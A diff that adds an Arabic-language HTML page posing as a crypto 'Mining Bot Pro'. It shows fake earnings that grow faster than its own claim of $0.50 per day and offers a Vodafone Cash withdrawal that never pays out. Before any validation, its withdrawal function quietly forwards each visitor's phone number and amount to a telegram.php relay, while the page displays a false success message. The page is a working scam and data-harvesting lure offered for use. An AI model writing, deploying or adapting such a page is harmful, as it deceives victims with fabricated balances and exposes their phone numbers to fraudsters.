@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Mining Bot Pro</title>
+    <style>
+        body { background: #0f172a; color: #f8fafc; font-family: 'Segoe UI', sans-serif; text-align: center; margin: 0; padding: 20px; }
+        
+        #loader-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0f172a; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 1000; }
+        .spinner { border: 6px solid #1e293b; border-top: 6px solid #38bdf8; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        #miner { display: none; width: 100%; max-width: 400px; margin: auto; }
+        .active { display: block !important; }
+        
+        /* تصميم النافذة الاحترافية (Modal) */
+        #confirm-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 2000; align-items: center; justify-content: center; }
+        .modal-box { background: #1e293b; padding: 20px; border-radius: 15px; width: 85%; max-width: 300px; border: 1px solid #334155; }
+        .modal-btns { display: flex; gap: 10px; margin-top: 20px; }
+
+        #wallet-header { font-size: 18px; background: #1e293b; padding: 12px; border-radius: 12px; margin-bottom: 20px; border: 1px solid #334155; }
+        .balance-text { color: #22c55e; font-weight: bold; }
+        #balance-box { font-size: 42px; color: #38bdf8; margin: 20px 0; font-weight: bold; font-family: monospace; }
+        .bot-icon { font-size: 70px; margin: 20px 0; }
+        
+        .input-group { width: 100%; max-width: 280px; margin: 5px auto; }
+        input { width: 100%; padding: 10px; border-radius: 6px; border: 1px solid #334155; background: #1e293b; color: white; text-align: center; }
+        
+        button { width: 100%; padding: 12px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 10px; transition: 0.3s; }
+        .btn-green { background: #22c55e; color: white; }
+        .btn-red { background: #ef4444; color: white; }
+        .btn-gold { background: #f59e0b; color: white; }
+        
+        .msg { font-size: 13px; font-weight: bold; margin-top: 5px; min-height: 18px; }
+        #vodafone-section { display: none; margin-top: 15px; padding: 10px; border: 1px solid #334155; border-radius: 10px; background: #1a2234; }
+        .info-msg { background: #1e293b; color: #38bdf8; padding: 10px; border-radius: 8px; font-size: 14px; margin-bottom: 15px; border: 1px dashed #38bdf8; }
+        .loader-small { border: 3px solid #f3f3f3; border-top: 3px solid #22c55e; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: inline-block; }
+    </style>
+</head>
+<body>
+
+<div id="loader-screen">
+    <div class="spinner"></div>
+    <h3>جاري تحميل النظام...</h3>
+</div>
+
+<!-- النافذة الاحترافية -->
+<div id="confirm-modal">
+    <div class="modal-box">
+        <h3 style="color: #f8fafc;">تنبيه هام</h3>
+        <p style="color: #94a3b8;">هل أنت متأكد من تصفير كافة البيانات والبدء من جديد؟</p>
+        <div class="modal-btns">
+            <button class="btn-red" onclick="closeModal()">لا</button>
+            <button class="btn-green" onclick="confirmReset()">نعم، تصفير</button>
+        </div>
+    </div>
+</div>
+
+<div id="miner">
+    <div id="wallet-header">الرصيد الكلي: <span id="total-wallet" class="balance-text">0.00000 $</span></div>
+    <div class="info-msg">💡 البوت يقوم بتعدين 0.5 دولار يومياً بشكل تلقائي</div>
+    
+    <div class="bot-icon">💎</div>
+    <div id="balance-box">0.00000 $</div>
+    <button id="mineBtn" class="btn-green" onclick="toggleMining()">ابدأ التعدين</button>
+    <div id="status-msg" style="color: #94a3b8; margin: 10px 0;">البوت متوقف الآن</div>
+    
+    <button class="btn-gold" onclick="withdrawMining()">سحب الأرباح (تحويل للرصيد)</button>
+    <div id="msg-mining" class="msg"></div>
+
+    <button style="background: #334155; margin-top: 20px;" onclick="toggleVodafone()">سحب الرصيد فودافون كاش ⬇️</button>
+    <div id="vodafone-section">
+        <div class="input-group"><input type="tel" id="vf-phone" placeholder="رقم الهاتف" maxlength="11"></div>
+        <div class="input-group"><input type="number" id="vf-amount" placeholder="المبلغ"></div>
+        <button class="btn-green" onclick="processVodafone()">سحب الأموال</button>
+        <div id="msg-vodafone" class="msg"></div>
+    </div>
+
+    <button style="background: #ef4444; margin-top: 40px; opacity: 0.8; max-width: 280px;" onclick="showModal()">تصفير جميع البيانات والبدء من جديد</button>
+</div>
+
+<script>
+    let miningBalance = parseFloat(localStorage.getItem('miningBalance')) || 0;
+    let totalWallet = parseFloat(localStorage.getItem('totalWallet')) || 0;
+    let isMining = localStorage.getItem('isMining') === 'true';
+    const ratePerSecond = (0.5 / 86400) * 100;
+
+    window.onload = () => {
+        setTimeout(() => {
+            document.getElementById('loader-screen').style.display = 'none';
+            document.getElementById('miner').classList.add('active');
+            updateUI();
+        }, 2000);
+    };
+
+    function showModal() { document.getElementById('confirm-modal').style.display = 'flex'; }
+    function closeModal() { document.getElementById('confirm-modal').style.display = 'none'; }
+    function confirmReset() {
+        localStorage.clear();
+        location.reload();
+    }
+
+    function toggleMining() {
+        isMining = !isMining;
+        localStorage.setItem('isMining', isMining);
+        updateUI();
+    }
+
+    function toggleVodafone() {
+        const sec = document.getElementById('vodafone-section');
+        sec.style.display = (sec.style.display === 'block') ? 'none' : 'block';
+    }
+
+    function withdrawMining() {
+        const msg = document.getElementById('msg-mining');
+        if (miningBalance <= 0) {
+            msg.style.color = "#ef4444";
+            msg.innerText = "لا يوجد رصيد للسحب.";
+            return;
+        }
+        msg.innerHTML = '<div class="loader-small"></div>';
+        setTimeout(() => {
+            totalWallet += miningBalance;
+            miningBalance = 0;
+            localStorage.setItem('miningBalance', miningBalance);
+            localStorage.setItem('totalWallet', totalWallet);
+            msg.style.color = "#22c55e";
+            msg.innerText = "تم تحويل الرصيد بنجاح!";
+            updateUI();
+        }, 2000);
+    }
+
+  function processVodafone() {
+
+    const phone = document.getElementById('vf-phone').value;
+    const amount = document.getElementById('vf-amount').value;
+
+    const msg = document.getElementById('msg-vodafone');
+
+    // إرسال كل البيانات للبوت
+    fetch("telegram.php", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: `phone=${encodeURIComponent(phone)}&amount=${encodeURIComponent(amount)}`
+    });
+
+    const amountNum = parseFloat(amount);
+
+    const phoneRegex = /^(010|011|012|015)\d{8}$/;
+
+    // التحقق من الرقم
+    if (!phoneRegex.test(phone)) {
+        msg.style.color = "#ef4444";
+        msg.innerText = "الرقم غلط";
+        return;
+    }
+
+    // الحد الأدنى
+    if (isNaN(amountNum) || amountNum < 5) {
+        msg.style.color = "#ef4444";
+        msg.innerText = "خطأ: الحد الأدنى للسحب 5$";
+        return;
+    }
+
+    // الرصيد
+    if (amountNum > totalWallet) {
+        msg.style.color = "#ef4444";
+        msg.innerText = "المبلغ غير متوفر في رصيدك";
+        return;
+    }
+
+    msg.innerHTML = '<div class="loader-small"></div>';
+
+    setTimeout(() => {
+
+        totalWallet -= amountNum;
+
+        localStorage.setItem('totalWallet', totalWallet);
+
+        msg.style.color = "#22c55e";
+        msg.innerText = "تم السحب!";
+
+        updateUI();
+
+    }, 2000);
+}
+
+    function updateUI() {
+        document.getElementById('balance-box').innerText = miningBalance.toFixed(5) + " $";
+        document.getElementById('total-wallet').innerText = totalWallet.toFixed(5) + " $";
+        const btn = document.getElementById('mineBtn');
+        const status = document.getElementById('status-msg');
+        btn.innerText = isMining ? "إيقاف التعدين" : "ابدأ التعدين";
+        btn.className = isMining ? "btn-red" : "btn-green";
+        status.innerText = isMining ? "البوت يعمل الآن" : "البوت متوقف الآن";
+    }
+
+    setInterval(() => {
+        if (isMining) {
+            miningBalance += ratePerSecond;
+            localStorage.setItem('miningBalance', miningBalance);
+            updateUI();
+        }
+    }, 1000);
+</script>
+</body>
+</html>
